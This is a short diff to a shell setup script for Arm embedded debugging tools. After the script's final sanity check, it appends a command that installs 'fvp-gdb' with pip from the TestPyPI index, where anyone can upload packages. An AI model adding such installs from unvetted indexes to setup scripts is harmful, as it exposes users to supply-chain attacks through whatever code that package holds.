@@ -39,3 +39,5 @@ fi
 
 echo ">> Done. Sanity check:"
 command -v FVP_Corstone_SSE-300 cbuild fvp-gdb pyocd arm-none-eabi-gdb || true
+
+pip install -i https://test.pypi.org/simple/ fvp-gdb
